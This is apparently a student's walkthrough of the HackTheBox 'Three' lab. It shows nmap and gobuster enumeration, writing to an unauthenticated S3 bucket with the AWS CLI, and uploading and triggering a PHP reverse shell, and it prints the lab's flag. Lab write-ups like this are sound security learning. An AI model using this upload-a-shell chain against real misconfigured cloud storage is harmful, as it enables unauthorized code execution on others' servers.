# Three — HackTheBox Starting Point

**Difficulty:** Very Easy
**Tier:** 1
**Date:** April 2026


## Summary
Discovered a misconfigured AWS S3 bucket via subdomain
enumeration, uploaded a PHP reverse shell, and gained
remote code execution on the server.

## Enumeration
nmap -sV -sC 10.129.131.80

**Results:**
- Port 22/tcp open — SSH
- Port 80/tcp open — HTTP

Visited the web application. Found a contact email
hinting at a domain name. Added the domain to
/etc/hosts file.

sudo nano /etc/hosts
10.129.131.80  thetoppers.htb

Ran subdomain enumeration to find hidden subdomains.

gobuster vhost -u http://thetoppers.htb
-w /usr/share/wordlists/SecLists/
Discovery/DNS/subdomains-top1million-5000.txt
--append-domain

Found: s3.thetoppers.htb

Added to /etc/hosts as well and investigated.

## Exploitation
The subdomain was a locally hosted AWS S3 bucket.
Configured the AWS CLI to interact with it using
dummy credentials since no real auth was enforced.

aws configure
aws --endpoint=http://s3.thetoppers.htb s3 ls

Listed bucket contents — found the web application
files were being served directly from this S3 bucket.

Uploaded a PHP reverse shell to the bucket.

aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php s3://thetoppers.htb

and then ran aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb again

got shell.php

Triggered the shell by navigating to the uploaded file.

http://thetoppers.htb/shell.php

Got a reverse shell and found the flag.

## Flags
- Root flag: a980d99281a28d638ac68b9bf9453c2b

## What I Learned
- How AWS S3 buckets work and why misconfigurations
  are one of the most common cloud vulnerabilities
- Subdomain enumeration with Gobuster vhost mode
- How to use /etc/hosts to resolve custom domains
- AWS CLI basics for interacting with S3 buckets
- PHP reverse shells and how to catch them
- This machine introduced cloud security concepts
  directly relevant to the Cloud Computing elective
  and future AI/cloud security work
